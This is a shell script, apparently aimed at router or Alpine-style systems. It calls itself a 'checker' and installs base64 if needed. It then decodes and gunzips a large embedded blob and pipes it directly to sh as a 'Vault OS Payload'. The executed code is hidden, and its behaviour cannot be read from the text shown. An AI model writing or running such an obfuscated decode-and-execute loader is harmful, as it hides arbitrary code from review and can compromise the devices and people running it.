#!/bin/sh
echo "====================================================="
echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "📦 Installing decoding dependencies..."
    
    if command -v opkg >/dev/null 2>&1; then
        opkg update >/dev/null 2>&1
        opkg install coreutils-base64 >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add coreutils >/dev/null 2>&1 
    else
        echo "❌ ERROR: No package manager found! Cannot install base64."
        exit 1
    fi
    
    if ! command -v base64 >/dev/null 2>&1; then
         echo "❌ ERROR: Base64 installation failed. Aborting."
         exit 1
    fi
fi

PAYLOAD="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"

echo "🚀 Executing Vault OS Payload..."
echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
